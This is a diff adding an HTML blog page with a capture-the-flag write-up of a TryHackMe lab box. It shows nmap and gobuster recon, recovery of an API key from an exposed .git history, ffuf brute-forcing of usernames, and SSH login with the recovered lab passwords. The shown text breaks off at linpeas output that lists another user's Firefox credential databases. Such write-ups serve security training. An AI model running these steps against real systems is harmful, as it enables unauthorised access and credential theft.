@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en-us">
+<head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#1b1b1b">
+	<title>Chronicles | Dexter</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		
+  <meta itemprop="name" content="Chronicles">
+  <meta itemprop="description" content="Introduction Today we have a medium box called chronicle where we do some git forensics to get a key that gives us some user access into the machine and then doing some bit of browser forensics that enables us to move laterally as another user. Where we now find a binary that we can use to escalate our privileges. Here is the challenge link.
+Enumaration So first of all we can start by doing some basic enumaration just to have a good idea of what our target looks like. First of all I like using whatweb to get some juicy information like, we find that our target is running on ubuntu and powered by apache and the apache version.">
+  <meta itemprop="datePublished" content="2024-03-21T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-03-21T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2594">
+  <meta itemprop="keywords" content="Binary Exploitation,Web">
+	<link rel="stylesheet" href="/blog/css/bundle.css">
+	<link rel="icon" href="/blog/icons/16.png" sizes="16x16" type="image/png">
+	<link rel="icon" href="/blog/icons/32.png" sizes="32x32" type="image/png">
+</head>
+<body class="body kind-page">
+	<header class="header">
+	<a class="logo" href="/blog/">Dexter</a>
+	
+</header>
+	<div class="primary">
+	
+	<main class="main">
+		
+		<div class="single block">
+			<article class="entry">
+				<h1 class="entry__title">Chronicles</h1>
+<details class="entry__toc toc" open>
+	<summary class="toc__title">Table of Contents</summary>
+	<nav id="TableOfContents">
+  <ul>
+    <li><a href="#git-enumaration">Git enumaration</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav>
+</details>
+				<div class="entry__content"><h1 id="introduction">Introduction</h1>
+<p>Today we have a medium box called chronicle where we do some git forensics to get a key that gives us some user access into the machine and then doing some bit of browser forensics that enables us to move laterally as another user. Where we now find a binary that we can use to escalate our privileges. Here is the challenge <a href="https://tryhackme.com/r/room/chronicle">link</a>.</p>
+<h1 id="enumaration">Enumaration</h1>
+<p>So first of all we can start by doing some basic enumaration just to have a good idea of what our target looks like. First of all I like using <code>whatweb</code> to get some juicy information like, we find that our target is running on ubuntu and powered by apache and the apache version.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/THM/chronicle$ whatweb http://10.10.202.252
+</span></span><span style="display:flex;"><span>http://10.10.202.252 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.29<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.202.252<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Next up we can then run an <code>Nmap</code> scan, where this helps us to scan for open portson our target.</p>
+<pre tabindex="0"><code>dexter@lab:~/lab/THM/chronicle$ sudo nmap -sCV 10.10.202.252 -vv            
+[sudo] password for dexter: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 05:56 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 05:56
+Completed NSE at 05:56, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 05:56
+Completed NSE at 05:56, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 05:56
+Completed NSE at 05:56, 0.00s elapsed
+Initiating Ping Scan at 05:56
+Scanning 10.10.202.252 [4 ports]
+Completed Ping Scan at 05:56, 0.19s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 05:56
+Completed Parallel DNS resolution of 1 host. at 05:56, 0.03s elapsed
+Initiating SYN Stealth Scan at 05:56
+Scanning 10.10.202.252 [1000 ports]
+Discovered open port 22/tcp on 10.10.202.252
+Discovered open port 80/tcp on 10.10.202.252
+Discovered open port 8081/tcp on 10.10.202.252
+Increasing send delay for 10.10.202.252 from 0 to 5 due to 284 out of 945 dropped probes since last increase.
+Increasing send delay for 10.10.202.252 from 5 to 10 due to 11 out of 14 dropped probes since last increase.
+Increasing send delay for 10.10.202.252 from 10 to 20 due to max_successful_tryno increase to 4
+Increasing send delay for 10.10.202.252 from 20 to 40 due to 11 out of 16 dropped probes since last increase.
+Increasing send delay for 10.10.202.252 from 40 to 80 due to 11 out of 13 dropped probes since last increase.
+Increasing send delay for 10.10.202.252 from 80 to 160 due to 11 out of 13 dropped probes since last increase.
+Increasing send delay for 10.10.202.252 from 160 to 320 due to 11 out of 12 dropped probes since last increase.
+Increasing send delay for 10.10.202.252 from 320 to 640 due to 11 out of 11 dropped probes since last increase.
+Increasing send delay for 10.10.202.252 from 640 to 1000 due to 11 out of 11 dropped probes since last increase.
+Completed SYN Stealth Scan at 05:57, 67.97s elapsed (1000 total ports)
+Initiating Service scan at 05:57
+Scanning 3 services on 10.10.202.252
+Completed Service scan at 05:57, 6.76s elapsed (3 services on 1 host)
+NSE: Script scanning 10.10.202.252.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 05:57
+Completed NSE at 05:57, 7.67s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 05:57
+Completed NSE at 05:57, 0.72s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 05:57
+Completed NSE at 05:57, 0.00s elapsed
+Nmap scan report for 10.10.202.252
+Host is up, received echo-reply ttl 63 (0.20s latency).
+Scanned at 2024-02-15 05:56:33 EST for 83s
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b2:4c:49:da:7c:9a:3a:ba:6e:59:46:c2:a9:e6:a2:35 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDELanAivcbXHH+RqBWDQUmT0TJPTzxJ4XOLkZ4hQYAYCUXQ25C24k6ijW6MnKiImF9m9CoMdlzXIAC/DYArGJu+q5L68V1SAaqtS5YljXGb517Qi4ixekjaLua9Z+Du00c0nGWC46WA+JCjI6UP8FlTyNONXJ4Wv8T7ZA6T8rTrWZWd6dSTIKaZaN8fsD31cIJMuX2whX8IczzwzFuxp2ucPLJ0IwpoiX3ubuqUz4kkNi8FI5T2hweqqygLPmdA8AySZrIbmC4AusmmHwSf99aUHXjZ5Z6fHbHAwH0dsGDFaDvHuVFEp4l1h9TpZiKghUllDx9+6eRyKprJMpfvXZ1
+|   256 7a:3e:30:70:cf:32:a4:f2:0a:cb:2b:42:08:0c:19:bd (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPxb2LHHqkJNa+RUETb+7kg2rLKG3IxkiOZnG3YP7R5hd2KqQC1eJL1UyHcBKdOYrFllM43rkqfDVSxtm2f/ivc=
+|   256 4f:35:e1:33:96:84:5d:e5:b3:75:7d:d8:32:18:e0:a8 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPwYIfNblUpR0Hf/77s33mZq1OUXZD4jQacBQBwiLapr
+80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+8081/tcp open  http    syn-ack ttl 63 Werkzeug httpd 1.0.1 (Python 3.6.9)
+| http-methods: 
+|_  Supported Methods: HEAD OPTIONS GET
+|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).
+|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 05:57
+Completed NSE at 05:57, 0.01s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 05:57
+Completed NSE at 05:57, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 05:57
+Completed NSE at 05:57, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 84.40 seconds
+           Raw packets sent: 1440 (63.336KB) | Rcvd: 1087 (44.016KB)
+</code></pre><p>Nice we see we have three open ports including port 22(ssh), port 80(http), port 8081(http). Next we can fire up gobuster in order to enumarate for hidden directories.</p>
+<pre tabindex="0"><code>dexter@lab:~/lab/THM/chronicle$ gobuster dir -u http://10.10.202.252/ --wordlist /usr/share/dirb/wordlists/common.txt -t 20
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.202.252/
+[+] Method:                  GET
+[+] Threads:                 20
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 278]
+/.hta                 (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/index.html           (Status: 200) [Size: 15]
+/old                  (Status: 301) [Size: 312] [--&gt; http://10.10.202.252/old/]
+/server-status        (Status: 403) [Size: 278]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+===============================================================
+</code></pre><p>Gobuster brings up results of directories with some status codes The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status#redirection_messages">status code</a> 301 is a redirection message that tells us the requested resource has been changed permanently and that the new URL is given in the response. So in our exampl we are given the new URL.</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>We can then visit the URL and we are met by some directory lists.
+<img src="https://gist.github.com/assets/116626767/e97e2050-5755-4850-af5b-879a35d29016" alt="old_directory_listing"></p>
+<p>We can see we have a note.txt which we can can have a look, could be some developer note in there.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/THM/chronicle$ curl 10.10.202.252/old/note.txt 
+</span></span><span style="display:flex;"><span>Everything has been moved to new directory and the webapp has been deployed
+</span></span></code></pre></div><p>Not really much there right. Maybe we can get the whole directory into our machine using <code>wget</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/THM/chronicle$ wget --recursive http://10.10.202.252/old/.git --continue
+</span></span><span style="display:flex;"><span>--2024-02-15 06:05:43--  http://10.10.202.252/old/.git
+</span></span><span style="display:flex;"><span>Connecting to 10.10.202.252:80... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">301</span> Moved Permanently
+</span></span><span style="display:flex;"><span>Location: http://10.10.202.252/old/.git/ <span style="color:#f92672">[</span>following<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>--2024-02-15 06:05:44--  http://10.10.202.252/old/.git/
+</span></span><span style="display:flex;"><span>Reusing existing connection to 10.10.202.252:80.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">2891</span> <span style="color:#f92672">(</span>2.8K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/html<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: ‘10.10.202.252/old/.git’
+</span></span></code></pre></div><h2 id="git-enumaration">Git enumaration</h2>
+<p>We can check git logs now and see if commits and changes have been made before. We can do this by doing <code>git log -p</code> that will get all the commits and changes.</p>
+<p>Going down the changes we see that we get something interesting here.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Author: root &lt;cirius@incognito.com&gt;
+</span></span><span style="display:flex;"><span>Date:   Fri Mar <span style="color:#ae81ff">26</span> 22:34:33 <span style="color:#ae81ff">2021</span> +0000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Finishing Things
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>diff --git a/app.py b/app.py
+</span></span><span style="display:flex;"><span>index 8c729fd..cbf47f5 <span style="color:#ae81ff">100644</span>
+</span></span><span style="display:flex;"><span>--- a/app.py
+</span></span><span style="display:flex;"><span>+++ b/app.py
+</span></span><span style="display:flex;"><span>@@ -22,11 +22,11 @@ def info<span style="color:#f92672">(</span>uname<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>     print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;OK&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     data<span style="color:#f92672">=</span>request.get_json<span style="color:#f92672">(</span>force<span style="color:#f92672">=</span>True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     print<span style="color:#f92672">(</span>data<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>-    <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>data<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;key&#39;</span><span style="color:#f92672">]==</span><span style="color:#e6db74">&#39;abcd&#39;</span><span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>+    <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>data<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;key&#39;</span><span style="color:#f92672">]==</span><span style="color:#e6db74">&#39;7454c262d0d5a3a0c0b678d6c0dbc7ef&#39;</span><span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>uname<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;admin&#34;</span><span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>-            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;password&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>+            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;password&#34;}&#39;</span>     <span style="color:#75715e">#Default Change them as required</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">elif</span><span style="color:#f92672">(</span>uname<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;someone&#34;</span><span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>-            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;{&#34;username&#34;:&#34;someone&#34;,&#34;password&#34;:&#34;someword&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>+            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;{&#34;username&#34;:&#34;someone&#34;,&#34;password&#34;:&#34;someword&#34;}&#39;</span>   <span style="color:#75715e">#Some other user</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Invalid Username&#39;</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">else</span>:
+</span></span></code></pre></div><p>This looks like a key, but where do is the key required, Maybe something under port 8081.</p>
+<p><img src="https://gist.github.com/assets/116626767/49281124-7964-42a8-8188-149f58f97ccf" alt="port_8081"></p>
+<p>And interesting enough we see a login page.</p>
+<p><img src="https://gist.github.com/assets/116626767/c7508db4-492a-45f7-826d-6d57bd49960a" alt="login_page"></p>
+<p>Interesting enough we see that we only the forgot password button works, we can try to fire up burp and maybe capture what the request does.</p>
+<p><img src="https://gist.github.com/assets/116626767/298cc3e0-69d3-49db-a356-b7692362adac" alt="burp_key_change"></p>
+<p>Okay we see a request that uses a key and brings back an invalid username response, interesting yea, maybe we can try and fuzz to find possible users who use the the key or something, using <code>ffuf</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/THM/chronicle/10.10.202.252/old$ ffuf -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -X POST -d <span style="color:#e6db74">&#39;{&#34;key&#34;:&#34;7454c262d0d5a3a0c0b678d6c0dbc7ef&#34;}&#39;</span> -u http://10.10.202.252:8081/api/FUZZ -fw <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : POST
+</span></span><span style="display:flex;"><span> :: URL              : http://10.10.202.252:8081/api/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+</span></span><span style="display:flex;"><span> :: Data             : <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;key&#34;</span>:<span style="color:#e6db74">&#34;7454c262d0d5a3a0c0b678d6c0dbc7ef&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span> :: Filter           : Response words: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tommy                   <span style="color:#f92672">[</span>Status: 200, Size: 49, Words: 1, Lines: 1, Duration: 162ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>someone                 <span style="color:#f92672">[</span>Status: 200, Size: 49, Words: 1, Lines: 1, Duration: 153ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>??????                  <span style="color:#f92672">[</span>Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 185ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>?????                   <span style="color:#f92672">[</span>Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 161ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>10000/10000<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">75</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:01:45<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</span></span></code></pre></div><p>Okay we get two possible usernames on the same and we can go back to burp and try and see if we get a sort of response using the following usernames.</p>
+<p><img src="https://gist.github.com/assets/116626767/4b78e9b1-67e0-497a-9303-785a4ecd5980" alt="haha_burp_key_again"></p>
+<p><img src="https://gist.github.com/assets/116626767/df566873-85f8-44fa-80a5-3feb84fd8598" alt="also_burp_key_change"></p>
+<p>So now changing the usernames we can now get the passwords and now we can try and use ssh to connet to the machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/THM/chronicle$ ssh tommy@10.10.202.252          
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.202.252 (10.10.202.252)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:B60EpPl2+Wzi63sLsxMDA4mwQ4W1Rc98XeO/0rlYvCM.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.202.252<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tommy@10.10.202.252&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-142-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System information as of Thu Feb <span style="color:#ae81ff">15</span> 11:34:19 UTC <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:  0.09              Processes:           <span style="color:#ae81ff">99</span>
+</span></span><span style="display:flex;"><span>  Usage of /:   60.6% of 8.79GB   Users logged in:     <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  Memory usage: 41%               IP address <span style="color:#66d9ef">for</span> eth0: 10.10.202.252
+</span></span><span style="display:flex;"><span>  Swap usage:   0%
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">73</span> packages can be updated.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> update is a security update.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*** System restart required ***
+</span></span><span style="display:flex;"><span>Last login: Fri Apr <span style="color:#ae81ff">16</span> 14:05:02 <span style="color:#ae81ff">2021</span> from 192.168.29.217
+</span></span><span style="display:flex;"><span>tommy@incognito:~$ ls
+</span></span><span style="display:flex;"><span>user.txt  web
+</span></span><span style="display:flex;"><span>tommy@incognito:~$ cat user.txt
+</span></span></code></pre></div><p>We area able to connect and we find the user flag there. We then see we cannot really do much as user <code>tommy</code> so we might need to move laterally or try and escalate our privileges.</p>
+<p>So moving into our home directory we actually find out that there is another user</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tommy@incognito:/home$ ls
+</span></span><span style="display:flex;"><span>carlJ  tommyV
+</span></span></code></pre></div><p>From here we can send over <code>linpeas</code> to try and do some further enumaration on our target machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files <span style="color:#f92672">(</span>limit 100<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/cert9.db: SQLite 3.x database, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/content-prefs.sqlite: SQLite 3.x database, user version 4, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/cookies.sqlite: SQLite 3.x database, user version 12, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/favicons.sqlite: SQLite 3.x database, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/formhistory.sqlite: SQLite 3.x database, user version 4, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/key4.db: SQLite 3.x database, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/permissions.sqlite: SQLite 3.x database, user version 11, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/places.sqlite: SQLite 3.x database, user version 53, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/protections.sqlite: SQLite 3.x database, user version 1, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/default/moz-extension+++dd7547ec-9377-4ab1-9ad9-c12821434fc2^userContextId<span style="color:#f92672">=</span>4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite: SQLite 3.x database, user version 416, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite: SQLite 3.x database, user version 416, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite: SQLite 3.x database, user version 416, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite: SQLite 3.x database, user version 416, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite: SQLite 3.x database, user version 416, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite: SQLite 3.x database, user version 416, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite: SQLite 3.x database, user version 416, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage.sqlite: SQLite 3.x database, user version 131075, last written using SQLite version <span style="color:#ae81ff">3032003</span>
+</span></span><span style="display:flex;"><span>Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/webappsstore.sqlite: SQLite 3.x database, user version 2, last written using SQLite version <span style="color:#ae81ff">3032003</span>
